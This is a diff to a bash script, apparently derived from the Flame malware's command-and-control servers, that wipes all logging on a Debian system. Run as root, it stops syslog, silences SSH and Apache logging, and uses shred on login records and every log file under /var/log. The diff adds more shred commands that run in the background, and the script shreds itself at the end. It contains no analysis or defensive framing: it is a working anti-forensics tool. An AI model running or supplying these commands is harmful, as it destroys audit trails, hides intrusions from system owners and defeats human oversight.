@@ -1,14 +1,13 @@
 #!/bin/bash
 # Original source: http://www.securelist.com/en/blog/750/Full_Analysis_of_Flame_s_Command_Control_servers
 # Author: Stuxnext/Flame folks
-# Desc:
-#	This will remove all logging present on a Debian based system. Some tweaks
-# 	should be done to make it compatible with other systems, such as those
-#	that do not support shred.
+#
+# This script will remove all logging present on a Debian based system. Some tweaks
+# should be done to make it compatible with other systems, such as those
+# that do not support shred.
 
-# Let's check for root privs.
 if [[ $UID -ne 0 ]]; then
-	echo "$0 must be run as root to be completely effective."
+	echo "This script must be run as root to be completely effective."
 	exit 1
 fi
 
@@ -30,14 +29,6 @@ chkconfigm syslog off
 service syslog-ng stop
 chkconfig syslog-ng off
 
-# Delete various log files
-shred -fvzu -n 3 /var/log/wtmp
-shred -fvzu -n 3 /var/log/lastlog
-shred -fvzu -n 3 /var/run/utmp
-shred -fvzu -n 3 /var/log/mail.*
-shred -fvzu -n 3 /var/log/syslog*
-shred -fvzu -n 3 /var/log/messages*
-
 # stop logging ssh
 cp /etc/ssh/aa
 sed -i 's/LogLevel.*/LogLevel QUIET/' /etc/ssh/sshd_config
@@ -57,6 +48,16 @@ sed -i 's|CustomLog [$/a-zA-Z0-9{}_.]*|CustomLog /dev/null|g' /etc/apache2/sites
 sed -i 's|LogLevel [$/a-zA-Z0-9{}_.]*|LogLevel emerg|g' /etc/apache2/sites-available/default-ssl
 shred -fvzu -n 3 /var/log/apache2/*
 service apache2 restart
+
+# Delete various log files
+shred -fvzu -n 3 /var/log/wtmp &
+shred -fvzu -n 3 /var/log/lastlog &
+shred -fvzu -n 3 /var/run/utmp &
+shred -fvzu -n 3 /var/log/mail.* &
+shred -fvzu -n 3 /var/log/syslog* &
+shred -fvzu -n 3 /var/log/messages* &
+shred -fvzu -n 3 /var/log/*.log &
+shred -fvzu -n 3 /var/log/*/*.log &
 
 # Self delete
 find ./ -type f | grep $0 | xargs -I {} shred -fvzu -n 3 {} \;
